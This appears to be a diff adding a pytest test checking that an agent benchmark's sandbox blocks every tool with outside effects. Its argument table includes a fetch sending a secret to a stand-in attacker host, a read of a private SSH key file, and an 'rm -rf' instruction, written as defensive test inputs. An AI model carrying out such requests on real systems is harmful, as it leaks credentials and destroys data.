@@ -415,3 +415,23 @@ def test_deep_search_never_opens_non_public_result_urls(monkeypatch):
     monkeypatch.setattr(web, "get", lambda url, params=None: links.encode())
     out = web.web_search("router admin page")
     assert out["pages"] == [] and "non-public" in out["skipped"][0]["reason"]
+
+
+# ---- benchmark sandbox ----------------------------------------------------------------
+
+
+def test_benchmark_trials_cannot_reach_the_outside_world():
+    # Defences are switched off in some benchmark configs, so every outside effect must be stubbed.
+    from my_agents.bench import bench_toolbox
+    box = bench_toolbox(Store(":memory:"), live=["github_create_issue", "run_coding_task", "web_fetch"])
+    outside = {"github_create_issue": {"repo": "Kp759/x", "title": "t", "body": "b"},
+               "github_comment": {"repo": "Kp759/x", "number": 1, "body": "b"},
+               "github_create_pr": {"repo_path": "/tmp", "title": "t", "body": "b"},
+               "run_coding_task": {"repo": "/tmp", "instruction": "rm -rf"},
+               "web_fetch": {"url": "https://attacker.example/?d=secret"},
+               "read_file": {"path": "~/.ssh/id_rsa"}, "github_clone": {"repo": "a/b"},
+               "web_search": {"query": "q"}, "search_papers": {"query": "q"}, "job_postings": {}}
+    for name, args in outside.items():
+        with pytest.raises(RuntimeError, match="not available in this benchmark"):
+            box[name].fn(**args)
+    assert box["add_task"].fn(title="local only")["id"] == 1  # store tools work, on the in-memory store
